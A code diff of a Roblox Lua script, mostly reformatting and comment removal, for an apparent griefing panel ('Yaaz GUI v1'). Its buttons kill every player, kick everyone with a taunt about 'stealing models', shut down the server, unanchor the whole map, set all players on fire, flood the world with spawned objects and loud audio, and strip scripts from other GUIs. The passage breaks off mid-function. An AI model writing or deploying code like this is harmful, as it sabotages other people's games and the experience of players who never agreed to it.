+    bgSound.Volume = 0.99
+    bgSound.Looped = true
+    bgSound.Parent = workspace
+    bgSound:Play()
+
+    local hint = Instance.new("Hint", workspace)
+    hint.Text = "Um, nachos"
+    wait(10)
+    hint:Destroy()
+end)
+
+createButton("Raining tacos", function()
+    for _, sound in pairs(game.Workspace:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+        end
+    end
+
+    local music = Instance.new("Sound")
+    music.SoundId = "rbxassetid://142376088"
+    music.Volume = 5
+    music.Looped = true
+    music.Parent = game.Workspace
+    music:Play()
+
+    for i = 1, 100 do
+        local taco = Instance.new("MeshPart")
+        taco.Size = Vector3.new(10, 5, 10)
+        taco.Position = Vector3.new(math.random(-100, 100), 100, math.random(-100, 100))
+        taco.Color = Color3.fromRGB(255, 223, 100)
+        taco.Material = Enum.Material.SmoothPlastic
+        taco.MeshId = "rbxassetid://6209526139"
+        taco.Parent = game.Workspace
+        taco.Velocity = Vector3.new(0, -math.random(30, 60), 0)
+    end
+end)
+
+createButton("Shedletsky??", function()
+    local ID = 84419218047002
+    local Skybox = true
+    local particle = true
+
+    local function applyDecals(part)
+        local faces = {"Front", "Back", "Top", "Bottom", "Left", "Right"}
+        for _, face in ipairs(faces) do
+            local decal = Instance.new("Decal")
+            decal.Texture = "http://www.roblox.com/asset/?id=" .. ID
+            decal.Face = face
+            decal.Parent = part
+        end
+    end
+
+    for _, obj in ipairs(game.Workspace:GetChildren()) do
+        if obj:IsA("Part") then
+            applyDecals(obj)
+        elseif obj:IsA("Model") then
+            for _, part in ipairs(obj:GetChildren()) do
+                if part:IsA("Part") then
+                    applyDecals(part)
                 end
             end
         end
+    end
 
-        local function messageLoop()
-            while wait(0.4) do
-                displayNachosMessage()
-            end
-        end
+    if Skybox then
+        local sky = Instance.new("Sky")
+        sky.Parent = game.Lighting
+        local skyboxId = "http://www.roblox.com/asset/?id=172423468"
+        sky.SkyboxBk = skyboxId
+        sky.SkyboxDn = skyboxId
+        sky.SkyboxFt = skyboxId
+        sky.SkyboxLf = skyboxId
+        sky.SkyboxRt = skyboxId
+        sky.SkyboxUp = skyboxId
+    end
 
-        local function nachosRainLoop()
-            while wait(1 / 30) do
-                spawnNachos()
-            end
-        end
-
-        coroutine.wrap(skyboxLoop)()
-        coroutine.wrap(destroyLoop)()
-        coroutine.wrap(soundLoop)()
-        coroutine.wrap(messageLoop)()
-        coroutine.wrap(nachosRainLoop)()
-
-        local bgSound = Instance.new("Sound")
-        bgSound.SoundId = SOUND_ID
-        bgSound.Volume = 0.99
-        bgSound.Looped = true
-        bgSound.Parent = workspace
-        bgSound:Play()
-
-        local hint = Instance.new("Hint", workspace)
-        hint.Text = "Um, nachos"
-        wait(10)
-        hint:Destroy()
-    end)
-
-    createButton("Raining tacos", function()
-        for _, sound in pairs(game.Workspace:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound:Stop()
-            end
-        end
-
-        local music = Instance.new("Sound")
-        music.SoundId = "rbxassetid://142376088"
-        music.Volume = 5
-        music.Looped = true
-        music.Parent = game.Workspace
-        music:Play()
-
-        for i = 1, 100 do
-            local taco = Instance.new("MeshPart")
-            taco.Size = Vector3.new(10, 5, 10)
-            taco.Position = Vector3.new(math.random(-100, 100), 100, math.random(-100, 100))
-            taco.Color = Color3.fromRGB(255, 223, 100)
-            taco.Material = Enum.Material.SmoothPlastic
-            taco.MeshId = "rbxassetid://6209526139"
-            taco.Parent = game.Workspace
-            taco.Velocity = Vector3.new(0, -math.random(30, 60), 0)
-        end
-    end)
-
-    createButton("Shedletsky??", function()
-        local ID = 84419218047002
-        local Skybox = true
-        local particle = true
-
-        local function applyDecals(part)
-            local faces = {"Front", "Back", "Top", "Bottom", "Left", "Right"}
-            for _, face in ipairs(faces) do
-                local decal = Instance.new("Decal")
-                decal.Texture = "http://www.roblox.com/asset/?id=" .. ID
-                decal.Face = face
-                decal.Parent = part
-            end
+    if particle then
+        local function addParticle(part)
+            local particleEmitter = Instance.new("ParticleEmitter")
+            particleEmitter.Texture = "http://www.roblox.com/asset/?id=" .. ID
+            particleEmitter.Rate = 200
+            particleEmitter.Parent = part
         end
 
         for _, obj in ipairs(game.Workspace:GetChildren()) do
             if obj:IsA("Part") then
-                applyDecals(obj)
+                addParticle(obj)
             elseif obj:IsA("Model") then
                 for _, part in ipairs(obj:GetChildren()) do
                     if part:IsA("Part") then
-                        applyDecals(part)
+                        addParticle(part)
                     end
                 end
             end
         end
-
-        if Skybox then
-            local sky = Instance.new("Sky")
-            sky.Parent = game.Lighting
-            local skyboxId = "http://www.roblox.com/asset/?id=172423468"
-            sky.SkyboxBk = skyboxId
-            sky.SkyboxDn = skyboxId
-            sky.SkyboxFt = skyboxId
-            sky.SkyboxLf = skyboxId
-            sky.SkyboxRt = skyboxId
-            sky.SkyboxUp = skyboxId
-        end
-
-        if particle then
-            local function addParticle(part)
-                local particleEmitter = Instance.new("ParticleEmitter")
-                particleEmitter.Texture = "http://www.roblox.com/asset/?id=" .. ID
-                particleEmitter.Rate = 200
-                particleEmitter.Parent = part
-            end
-
-            for _, obj in ipairs(game.Workspace:GetChildren()) do
-                if obj:IsA("Part") then
-                    addParticle(obj)
-                elseif obj:IsA("Model") then
-                    for _, part in ipairs(obj:GetChildren()) do
-                        if part:IsA("Part") then
-                            addParticle(part)
-                        end
-                    end
-                end
-            end
-        end
-    end)
+    end
+end)
 
 createButton("Chicken arms", function()
     local Chicken = game.Players.LocalPlayer.Name
     local character = game.Workspace[Chicken]
     
-    -- Left arm chicken pose
     character.Torso["Left Shoulder"].C0 = CFrame.new(-1.5, 0.5, 0) * 
         CFrame.fromEulerAnglesXYZ(0, math.pi/2, 0) * 
         CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * 
         CFrame.fromEulerAnglesXYZ(0, -math.pi/2, 0)
     character.Torso["Left Shoulder"].C1 = CFrame.new(0, 0.5, 0)
     
-    -- Right arm chicken pose
     character.Torso["Right Shoulder"].C0 = CFrame.new(1.5, 0.5, 0) * 
         CFrame.fromEulerAnglesXYZ(0, -math.pi/2, 0) * 
         CFrame.fromEulerAnglesXYZ(math.pi/2, 0, 0) * 
@@ -2025,21 +1691,18 @@ createButton("Head shake", function()
     local character = player.Character or player.CharacterAdded:Wait()
     local neck = character:WaitForChild("Torso"):WaitForChild("Neck")
 
-    -- Side-to-side shaking
     for x = 1, math.huge, 0.2 do 
         task.wait() 
         neck.C0 = CFrame.new(math.sin(x) / 1, 1.5, 0) 
         neck.C1 = CFrame.new(0, 0, 0) 
     end 
 
-    -- Spinning head effect
     for x = 1, math.huge, 0.1 do 
         task.wait() 
         neck.C0 = CFrame.new(0, 1.5, 0) * CFrame.fromAxisAngle(Vector3.new(0, 1, 0), x) 
         neck.C1 = CFrame.new(0, 0, 0) 
     end 
 
-    -- Big head effect on all players
     for _, player in ipairs(game.Players:GetPlayers()) do
         if player.Character and player.Character:FindFirstChild("Head") then
             local headMesh = player.Character.Head:FindFirstChildOfClass("SpecialMesh")
@@ -2063,233 +1726,227 @@ createButton("Floating pad", function()
     pad.Size = Vector3.new(8, 1.2, 8)
     pad.Anchored = true
     pad.Locked = true
-    pad.BrickColor = BrickColor.new("Black") -- Changed to black
-    pad.Color = Color3.new(0, 0, 0) -- Ensures it is fully black
+    pad.BrickColor = BrickColor.new("Black")
+    pad.Color = Color3.new(0, 0, 0)
 
-    -- Apply custom texture
     local texture = Instance.new("Decal")
     texture.Parent = pad
     texture.Texture = "rbxassetid://126968470687373"
     texture.Face = "Top"
 
-    -- Smooth cylinder shape
     local mesh = Instance.new("CylinderMesh")
     mesh.Scale = Vector3.new(1, 0.5, 1)
     mesh.Parent = pad
 
-    -- Movement loop (with proper cleanup)
     local connection
     connection = game:GetService("RunService").Heartbeat:Connect(function()
         pad.CFrame = CFrame.new(torso.Position.X, torso.Position.Y - 4, torso.Position.Z)
     end)
 
-    -- Cleanup when player dies or leaves
     player.CharacterRemoving:Connect(function()
         connection:Disconnect()
         pad:Destroy()
     end)
 end)
 
-    createButton("Epik power", function()
-        for _, player in pairs(game.Players:GetPlayers()) do
-            if player.Character and player.Character:FindFirstChild("Humanoid") then
-                local humanoid = player.Character.Humanoid
-                humanoid.WalkSpeed = 100
-                humanoid.JumpPower = 40
-            end
+createButton("Epik power", function()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild("Humanoid") then
+            local humanoid = player.Character.Humanoid
+            humanoid.WalkSpeed = 100
+            humanoid.JumpPower = 40
         end
-    end)
+    end
+end)
 
-    createButton("Lunar moon..", function()
-        local player = Players.LocalPlayer
-        local character = player.Character
-        if character and character:FindFirstChildOfClass("Humanoid") then
-            local humanoid = character:FindFirstChildOfClass("Humanoid")
-            
-            GravityEnabled = not GravityEnabled
-            
-            if GravityEnabled then
-                Workspace.Gravity = 30
-                humanoid.UseJumpPower = true
-                
-                humanoid.JumpPower = 130
-            else
-                Workspace.Gravity = 196.2
-                humanoid.JumpPower = 50
-            end
-        end
-    end)
-
-    createButton("Create Baseplate", function()
-        local baseplate = Instance.new("Part")
-        baseplate.Size = Vector3.new(512, 1, 512)
-        baseplate.Position = Vector3.new(0, 0, 0)
-        baseplate.Anchored = true
-        baseplate.Material = Enum.Material.SmoothPlastic
-        baseplate.BrickColor = BrickColor.new("Medium stone grey")
-        baseplate.Parent = game.Workspace
-    end)
-
-    createButton("Unanchored all", function()
-        for _, part in ipairs(workspace:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.Anchored = false
-            end
-        end
-    end)
-
-    createButton("Shutdown", function()
-        local Players = game:GetService("Players")
-
-        local message = "um shutdown ig? we'll be okay."
-
-        for _, player in pairs(Players:GetPlayers()) do
-            player:Kick(message)
-        end
-
-        game:Shutdown()
-    end)
-
-    createButton("Kill all", function()
-        local Players = game:GetService("Players")
-
-        local function killAllPlayers()
-            for _, player in pairs(Players:GetPlayers()) do
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    player.Character.Humanoid.Health = 0
-                end
-            end
-        end
+createButton("Lunar moon..", function()
+    local player = Players.LocalPlayer
+    local character = player.Character
+    if character and character:FindFirstChildOfClass("Humanoid") then
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
         
-        killAllPlayers()
-    end)
+        GravityEnabled = not GravityEnabled
+        
+        if GravityEnabled then
+            Workspace.Gravity = 30
+            humanoid.UseJumpPower = true
+            
+            humanoid.JumpPower = 130
+        else
+            Workspace.Gravity = 196.2
+            humanoid.JumpPower = 50
+        end
+    end
+end)
 
-    createButton("Shrek moment", function()
-        local sky = Instance.new("Sky")
-        sky.Parent = game.Lighting
-        sky.SkyboxBk = "http://www.roblox.com/asset/?id=136117211303723"
-        sky.SkyboxDn = "http://www.roblox.com/asset/?id=136117211303723"
-        sky.SkyboxFt = "http://www.roblox.com/asset/?id=136117211303723"
-        sky.SkyboxLf = "http://www.roblox.com/asset/?id=136117211303723"
-        sky.SkyboxRt = "http://www.roblox.com/asset/?id=136117211303723"
-        sky.SkyboxUp = "http://www.roblox.com/asset/?id=136117211303723"
+createButton("Create Baseplate", function()
+    local baseplate = Instance.new("Part")
+    baseplate.Size = Vector3.new(512, 1, 512)
+    baseplate.Position = Vector3.new(0, 0, 0)
+    baseplate.Anchored = true
+    baseplate.Material = Enum.Material.SmoothPlastic
+    baseplate.BrickColor = BrickColor.new("Medium stone grey")
+    baseplate.Parent = game.Workspace
+end)
 
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("BasePart") or obj:IsA("MeshPart") then
-                for _, face in pairs(Enum.NormalId:GetEnumItems()) do
-                    local decal = Instance.new("Decal")
-                    decal.Texture = "http://www.roblox.com/asset/?id=81790155091359"
-                    decal.Face = face
-                    decal.Parent = obj
-                end
+createButton("Unanchored all", function()
+    for _, part in ipairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = false
+        end
+    end
+end)
+
+createButton("Shutdown", function()
+    local Players = game:GetService("Players")
+
+    local message = "um shutdown ig? we'll be okay."
+
+    for _, player in pairs(Players:GetPlayers()) do
+        player:Kick(message)
+    end
+
+    game:Shutdown()
+end)
+
+createButton("Kill all", function()
+    local Players = game:GetService("Players")
+
+    local function killAllPlayers()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character and player.Character:FindFirstChild("Humanoid") then
+                player.Character.Humanoid.Health = 0
             end
         end
+    end
+    
+    killAllPlayers()
+end)
 
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("BasePart") or obj:IsA("MeshPart") then
-                local particle = Instance.new("ParticleEmitter")
-                particle.Texture = "http://www.roblox.com/asset/?id=133383145895738"
-                particle.Rate = 50
-                particle.Lifetime = NumberRange.new(2, 5)
-                particle.Parent = obj
+createButton("Shrek moment", function()
+    local sky = Instance.new("Sky")
+    sky.Parent = game.Lighting
+    sky.SkyboxBk = "http://www.roblox.com/asset/?id=136117211303723"
+    sky.SkyboxDn = "http://www.roblox.com/asset/?id=136117211303723"
+    sky.SkyboxFt = "http://www.roblox.com/asset/?id=136117211303723"
+    sky.SkyboxLf = "http://www.roblox.com/asset/?id=136117211303723"
+    sky.SkyboxRt = "http://www.roblox.com/asset/?id=136117211303723"
+    sky.SkyboxUp = "http://www.roblox.com/asset/?id=136117211303723"
+
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
+            for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                local decal = Instance.new("Decal")
+                decal.Texture = "http://www.roblox.com/asset/?id=81790155091359"
+                decal.Face = face
+                decal.Parent = obj
             end
         end
+    end
+
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
+            local particle = Instance.new("ParticleEmitter")
+            particle.Texture = "http://www.roblox.com/asset/?id=133383145895738"
+            particle.Rate = 50
+            particle.Lifetime = NumberRange.new(2, 5)
+            particle.Parent = obj
+        end
+    end
+
+    while true do
+        local shrek = Instance.new("MeshPart")
+        shrek.Size = Vector3.new(20, 20, 20)
+        shrek.Position = Vector3.new(math.random(-200, 200), math.random(100, 200), math.random(-200, 200))
+        shrek.Parent = workspace
+        shrek.Anchored = false
+        shrek.CanCollide = false
+
+        shrek.MeshId = "http://www.roblox.com/asset/?id=439124838"
+        shrek.TextureID = "http://www.roblox.com/asset/?id=439124850"
+
+        local bodyVelocity = Instance.new("BodyVelocity")
+        bodyVelocity.Velocity = Vector3.new(0, -20, 0)
+        bodyVelocity.Parent = shrek
+
+        shrek.Touched:Connect(function(hit)
+            if hit:IsA("BasePart") then
+                shrek:Destroy()
+            end
+        end)
+
+        task.wait(0.1)
+    end
+end)
+
+createButton("Raining Pancakes", function()
+    for _, sound in pairs(game.SoundService:GetChildren()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+        end
+    end
+    for _, sound in pairs(workspace:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+        end
+    end
+
+    local newSound = Instance.new("Sound")
+    newSound.SoundId = "rbxassetid://9245558138"
+    newSound.Volume = 5
+    newSound.Looped = true
+    newSound.Parent = game.SoundService
+    newSound:Play()
+
+    local sky = Instance.new("Sky", game.Lighting)
+    sky.SkyboxBk = "rbxassetid://97363886273594"
+    sky.SkyboxDn = "rbxassetid://97363886273594"
+    sky.SkyboxFt = "rbxassetid://97363886273594"
+    sky.SkyboxLf = "rbxassetid://97363886273594"
+    sky.SkyboxRt = "rbxassetid://97363886273594"
+    sky.SkyboxUp = "rbxassetid://97363886273594"
+
+    while wait(0.1) do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(1, 1, 1)
+        part.Position = Vector3.new(math.random(-50, 50), 50, math.random(-50, 50))
+        part.Anchored = false
+        part.CanCollide = false
+        part.Parent = workspace
+
+        local mesh = Instance.new("SpecialMesh", part)
+        mesh.MeshId = "rbxassetid://923473197"
+        mesh.TextureId = "rbxassetid://923473203"
+        mesh.Scale = Vector3.new(20, 20, 20)
+
+        part.Touched:Connect(function(hit)
+            if hit:IsA("BasePart") and hit.Position.Y < 1 then
+                part:Destroy()
+            end
+        end)
+
+        game:GetService("Debris"):AddItem(part, 10)
+    end
+end)
+
+createButton("Map rotate", function()
+    local baseplate = workspace:FindFirstChild("Baseplate")
+    if baseplate and baseplate:IsA("BasePart") then
+        local tiltSpeed = 1
+        local maxTilt = 45
 
         while true do
-            local shrek = Instance.new("MeshPart")
-            shrek.Size = Vector3.new(20, 20, 20)
-            shrek.Position = Vector3.new(math.random(-200, 200), math.random(100, 200), math.random(-200, 200))
-            shrek.Parent = workspace
-            shrek.Anchored = false
-            shrek.CanCollide = false
-
-            shrek.MeshId = "http://www.roblox.com/asset/?id=439124838"
-            shrek.TextureID = "http://www.roblox.com/asset/?id=439124850"
-
-            local bodyVelocity = Instance.new("BodyVelocity")
-            bodyVelocity.Velocity = Vector3.new(0, -20, 0)
-            bodyVelocity.Parent = shrek
-
-            shrek.Touched:Connect(function(hit)
-                if hit:IsA("BasePart") then
-                    shrek:Destroy()
-                end
-            end)
-
-            task.wait(0.1)
-        end
-    end)
-
-    createButton("Raining Pancakes", function()
-        for _, sound in pairs(game.SoundService:GetChildren()) do
-            if sound:IsA("Sound") then
-                sound:Stop()
+            for angle = 0, maxTilt, tiltSpeed do
+                baseplate.CFrame = baseplate.CFrame * CFrame.Angles(math.rad(tiltSpeed), 0, 0)
+                task.wait(0.1)
+            end
+            for angle = maxTilt, 0, -tiltSpeed do
+                baseplate.CFrame = baseplate.CFrame * CFrame.Angles(math.rad(-tiltSpeed), 0, 0)
+                task.wait(0.1)
             end
         end
-        for _, sound in pairs(workspace:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound:Stop()
-            end
-        end
-
-        local newSound = Instance.new("Sound")
-        newSound.SoundId = "rbxassetid://9245558138"
-        newSound.Volume = 5
-        newSound.Looped = true
-        newSound.Parent = game.SoundService
-        newSound:Play()
-
-        local sky = Instance.new("Sky", game.Lighting)
-        sky.SkyboxBk = "rbxassetid://97363886273594"
-        sky.SkyboxDn = "rbxassetid://97363886273594"
-        sky.SkyboxFt = "rbxassetid://97363886273594"
-        sky.SkyboxLf = "rbxassetid://97363886273594"
-        sky.SkyboxRt = "rbxassetid://97363886273594"
-        sky.SkyboxUp = "rbxassetid://97363886273594"
-
-        while wait(0.1) do
-            local part = Instance.new("Part")
-            part.Size = Vector3.new(1, 1, 1)
-            part.Position = Vector3.new(math.random(-50, 50), 50, math.random(-50, 50))
-            part.Anchored = false
-            part.CanCollide = false
-            part.Parent = workspace
-
-            local mesh = Instance.new("SpecialMesh", part)
-            mesh.MeshId = "rbxassetid://923473197"
-            mesh.TextureId = "rbxassetid://923473203"
-            mesh.Scale = Vector3.new(20, 20, 20)
-
-            part.Touched:Connect(function(hit)
-                if hit:IsA("BasePart") and hit.Position.Y < 1 then
-                    part:Destroy()
-                end
-            end)
-
-            game:GetService("Debris"):AddItem(part, 10)
-        end
-    end)
-
-    createButton("Map rotate", function()
-        local baseplate = workspace:FindFirstChild("Baseplate")
-        if baseplate and baseplate:IsA("BasePart") then
-            local tiltSpeed = 1
-            local maxTilt = 45
-
-            while true do
-                for angle = 0, maxTilt, tiltSpeed do
-                    baseplate.CFrame = baseplate.CFrame * CFrame.Angles(math.rad(tiltSpeed), 0, 0)
-                    task.wait(0.1)
-                end
-                for angle = maxTilt, 0, -tiltSpeed do
-                    baseplate.CFrame = baseplate.CFrame * CFrame.Angles(math.rad(-tiltSpeed), 0, 0)
-                    task.wait(0.1)
-                end
-            end
-        end
-    end)
-
-
+    end
+end)
 
 createButton("Morph Duck", function()
     local player = game.Players.LocalPlayer
@@ -2299,17 +1956,15 @@ createButton("Morph Duck", function()
 
     if not humanoidRootPart or not humanoid then return end
 
-    -- Hide all character parts instead of destroying them (prevents reset)
     for _, v in pairs(character:GetChildren()) do
         if v:IsA("BasePart") or v:IsA("MeshPart") then
-            v.Transparency = 1 -- Make body invisible
+            v.Transparency = 1
             v.CanCollide = false
         elseif v:IsA("Accessory") or v:IsA("Clothing") or v:IsA("Decal") then
-            v:Destroy() -- Remove accessories and clothes
+            v:Destroy()
         end
     end
 
-    -- Hide the face
     local head = character:FindFirstChild("Head")
     if head then
         local face = head:FindFirstChild("face")
@@ -2318,7 +1973,6 @@ createButton("Morph Duck", function()
         end
     end
 
-    -- Create a new part for the duck morph
     local duckBody = Instance.new("Part")
     duckBody.Size = Vector3.new(5, 5, 5)
     duckBody.Name = "DuckBody"
@@ -2328,25 +1982,20 @@ createButton("Morph Duck", function()
     duckBody.CanCollide = false
     duckBody.Massless = true
 
-    -- Add the duck mesh
     local mesh = Instance.new("SpecialMesh", duckBody)
-    mesh.MeshId = "rbxassetid://17399705213" -- Duck Mesh
-    mesh.TextureId = "rbxassetid://17399705259" -- Duck Texture
+    mesh.MeshId = "rbxassetid://17399705213"
+    mesh.TextureId = "rbxassetid://17399705259"
     mesh.Scale = Vector3.new(5, 5, 5)
 
-    -- 🔥 **FIX: Adjust Offset & Rotation to Center the Duck**
-    mesh.Offset = Vector3.new(0, -2.5, 0) -- Move down slightly to align better
-    duckBody.Orientation = Vector3.new(90, 270, 0) -- Rotate to face forward (adjust as needed)
+    mesh.Offset = Vector3.new(0, -2.5, 0)
+    duckBody.Orientation = Vector3.new(90, 270, 0)
 
-    -- Weld the duck to the HumanoidRootPart (so it follows the player)
     local weld = Instance.new("WeldConstraint", duckBody)
     weld.Part0 = duckBody
     weld.Part1 = humanoidRootPart
 
-    -- Set WalkSpeed to 100
     humanoid.WalkSpeed = 100
 
-    -- Add "Duck" BillboardGUI above the player
     local billboard = Instance.new("BillboardGui", duckBody)
     billboard.Size = UDim2.new(5, 0, 1.5, 0)
     billboard.StudsOffset = Vector3.new(0, 3, 0)
@@ -2358,25 +2007,25 @@ createButton("Morph Duck", function()
     textLabel.BackgroundTransparency = 1
     textLabel.Text = "Duck"
     textLabel.TextScaled = true
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0) -- Yellow text
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
     textLabel.Font = Enum.Font.GothamBold
 end)
 
-    createButton("Fire all", function()
-        while true do
-            for _, player in pairs(game.Players:GetPlayers()) do
-                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    if not player.Character.HumanoidRootPart:FindFirstChild("Fire") then
-                        local fire = Instance.new("Fire")
-                        fire.Size = 10
-                        fire.Heat = 5
-                        fire.Parent = player.Character.HumanoidRootPart
-                    end
+createButton("Fire all", function()
+    while true do
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                if not player.Character.HumanoidRootPart:FindFirstChild("Fire") then
+                    local fire = Instance.new("Fire")
+                    fire.Size = 10
+                    fire.Heat = 5
+                    fire.Parent = player.Character.HumanoidRootPart
                 end
             end
-            task.wait(1)
         end
-    end)
+        task.wait(1)
+    end
+end)
 
 createButton("Plane", function()
     repeat wait() until game:IsLoaded() and game:service("Players").LocalPlayer.Character ~= nil
@@ -2385,13 +2034,11 @@ createButton("Plane", function()
     local player = game:GetService("Players").LocalPlayer
     local char = player.Character
 
-    -- Ensure the character has a Humanoid
     if not char:FindFirstChild("Humanoid") then
         local humanoid = Instance.new("Humanoid", char)
         humanoid.Name = "Humanoid"
     end
 
-    -- Remove all parts except the script, Humanoid, and essential components
     for i, v in pairs(char:GetChildren()) do 
         if v ~= script and not v:IsA("Humanoid") and not v:IsA("HumanoidRootPart") then 
             v:Destroy() 
@@ -2419,7 +2066,6 @@ createButton("Plane", function()
 
     script.Name = "AdvFlight"
 
-    -- Plane movement system (simple physics-based approach)
     local planeBody = Instance.new("Part", char)
     planeBody.Size = Vector3.new(10, 3, 10)
     planeBody.Position = Torsoz.Position + Vector3.new(0, 5, 0)
@@ -2428,18 +2074,15 @@ createButton("Plane", function()
     planeBody.Material = Enum.Material.SmoothPlastic
     planeBody.Name = "Plane"
     
-    -- Attach the player to the plane
     local weld = Instance.new("Weld", planeBody)
     weld.Part0 = planeBody
     weld.Part1 = Torsoz
     weld.C0 = CFrame.new(0, 2, 0)
 
-    -- Apply BodyVelocity for movement
     local bodyVelocity = Instance.new("BodyVelocity", planeBody)
     bodyVelocity.Velocity = Vector3.new(0, 0, 0)
     bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
 
-    -- Keybind movement controls
     mouse.KeyDown:Connect(function(key)
         if key == "w" then
             bodyVelocity.Velocity = cam.CFrame.LookVector * 50
@@ -2456,7 +2099,6 @@ createButton("Plane", function()
         end
     end)
 
-    -- Stop movement when key is released
     mouse.KeyUp:Connect(function(key)
         if key == "w" or key == "s" or key == "space" or key == "leftshift" then
             bodyVelocity.Velocity = Vector3.new(0, 0, 0)
@@ -2464,75 +2106,75 @@ createButton("Plane", function()
     end)
 end)
 
-    createButton("Reset Everything", function()
-        game.Lighting:ClearAllChildren()
-        game.Lighting.Ambient = Color3.new(1, 1, 1)
-        game.Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
-        game.Lighting.Brightness = 1
-        game.Lighting.FogEnd = 1000000
-        game.Lighting.FogStart = 0
-        game.Lighting.FogColor = Color3.fromRGB(255, 255, 255)
+createButton("Reset Everything", function()
+    game.Lighting:ClearAllChildren()
+    game.Lighting.Ambient = Color3.new(1, 1, 1)
+    game.Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
+    game.Lighting.Brightness = 1
+    game.Lighting.FogEnd = 1000000
+    game.Lighting.FogStart = 0
+    game.Lighting.FogColor = Color3.fromRGB(255, 255, 255)
 
-        for _, v in pairs(workspace:GetChildren()) do
-            if v:IsA("Sound") or v:IsA("Message") or v:IsA("Hint") or (v:IsA("Model") and v.Name == "DiscoPlayer") then
-                v:Destroy()
-            end
+    for _, v in pairs(workspace:GetChildren()) do
+        if v:IsA("Sound") or v:IsA("Message") or v:IsA("Hint") or (v:IsA("Model") and v.Name == "DiscoPlayer") then
+            v:Destroy()
         end
+    end
 
-        if game.Lighting:FindFirstChildOfClass("Sky") then
-            game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
+    if game.Lighting:FindFirstChildOfClass("Sky") then
+        game.Lighting:FindFirstChildOfClass("Sky"):Destroy()
+    end
+
+    for _, v in pairs(workspace:GetDescendants()) do
+        if v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Fire") then
+            v:Destroy()
         end
+    end
 
-        for _, v in pairs(workspace:GetDescendants()) do
-            if v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Fire") then
-                v:Destroy()
-            end
+    _G.Spam555 = false
+    _G.StopCoroutines = true
+
+    if _G.RunningCoroutines then
+        for _, coro in pairs(_G.RunningCoroutines) do
+            coroutine.yield(coro)
         end
+    end
+    _G.RunningCoroutines = {}
+end)
 
-        _G.Spam555 = false
-        _G.StopCoroutines = true
+createButton("Kick All", function()
+    for _, player in pairs(game.Players:GetPlayers()) do
+        player:Kick("YAY, THANK YOU FOR STEALING MODELS!")
+    end
+end)
 
-        if _G.RunningCoroutines then
-            for _, coro in pairs(_G.RunningCoroutines) do
-                coroutine.yield(coro)
-            end
+createButton("Floating pad", function()
+    if not rootPart then return end
+
+    local pad = Instance.new("Part")
+    pad.Size = Vector3.new(5, 1, 5)
+    pad.Position = rootPart.Position - Vector3.new(0, 3, 0)
+    pad.Anchored = false
+    pad.Color = Color3.fromRGB(255, 255, 255)
+    pad.Parent = workspace
+
+    local texture = Instance.new("Decal", pad)
+    texture.Texture = "rbxassetid://83823662527772"
+    texture.Face = Enum.NormalId.Top
+
+    local weld = Instance.new("WeldConstraint")
+    weld.Part0 = pad
+    weld.Part1 = rootPart
+    weld.Parent = pad
+
+    game:GetService("RunService").Heartbeat:Connect(function()
+        if humanoid:GetState() == Enum.HumanoidStateType.Jumping then
+            pad.Position = pad.Position + Vector3.new(0, 3, 0)
+        elseif humanoid.MoveDirection.Magnitude > 0 then
+            pad.Position = pad.Position - Vector3.new(0, 0.2, 0)
         end
-        _G.RunningCoroutines = {}
     end)
-
-    createButton("Kick All", function()
-        for _, player in pairs(game.Players:GetPlayers()) do
-            player:Kick("YAY, THANK YOU FOR STEALING MODELS!")
-        end
-    end)
-
-    createButton("Floating pad", function()
-        if not rootPart then return end
-
-        local pad = Instance.new("Part")
-        pad.Size = Vector3.new(5, 1, 5)
-        pad.Position = rootPart.Position - Vector3.new(0, 3, 0)
-        pad.Anchored = false
-        pad.Color = Color3.fromRGB(255, 255, 255)
-        pad.Parent = workspace
-
-        local texture = Instance.new("Decal", pad)
-        texture.Texture = "rbxassetid://83823662527772"
-        texture.Face = Enum.NormalId.Top
-
-        local weld = Instance.new("WeldConstraint")
-        weld.Part0 = pad
-        weld.Part1 = rootPart
-        weld.Parent = pad
-
-        game:GetService("RunService").Heartbeat:Connect(function()
-            if humanoid:GetState() == Enum.HumanoidStateType.Jumping then
-                pad.Position = pad.Position + Vector3.new(0, 3, 0)
-            elseif humanoid.MoveDirection.Magnitude > 0 then
-                pad.Position = pad.Position - Vector3.new(0, 0.2, 0)
-            end
-        end)
-    end)
+end)
 
 createButton("Infect other GUIs", function()
     local function RemoveScripts(object)
@@ -2544,17 +2186,15 @@ createButton("Infect other GUIs", function()
     end
 
     local function ChangeAllTextAndColor()
-        local myGui = game.CoreGui:FindFirstChild("Yaaz GUI v1") -- Replace with your actual GUI name
+        local myGui = game.CoreGui:FindFirstChild("Yaaz GUI v1")
 
         for _, object in pairs(game:GetDescendants()) do
             if object:IsA("TextButton") or object:IsA("TextLabel") then
                 local objectGui = object:FindFirstAncestorOfClass("ScreenGui")
 
